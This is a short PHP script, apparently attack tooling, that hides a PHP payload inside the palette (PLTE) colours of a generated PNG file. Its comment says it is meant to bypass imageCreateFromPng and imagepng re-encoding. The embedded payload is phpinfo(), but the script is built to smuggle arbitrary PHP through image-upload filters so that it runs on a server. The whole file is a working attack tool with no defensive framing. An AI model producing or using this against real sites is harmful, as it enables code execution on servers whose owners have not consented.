<?php 
//createPNGwithPLTE.php
// bypass imageCreateFromPng and imagepng 
$_payload="<?php phpinfo()?> ";
$_pay_len=strlen($_payload);
if(strlen($_payload)%3!=0){
 echo "payload%3==0 !"; exit();
}


$width=$_pay_len/3;
$height=20;
//$im = imageCreateFromPng("existing.png");
$im = imagecreate($width, $height);

$_hex=unpack('H*',$_payload);
$_chunks=str_split($_hex[1], 6);

for($i=0; $i < count($_chunks); $i++){

  $_color_chunks=str_split($_chunks[$i], 2);
  $color=imagecolorallocate($im,hexdec($_color_chunks[0]),hexdec($_color_chunks[1]),hexdec($_color_chunks[2]));

  imagesetpixel($im,$i,1,$color);

}

imagepng($im,"example.png");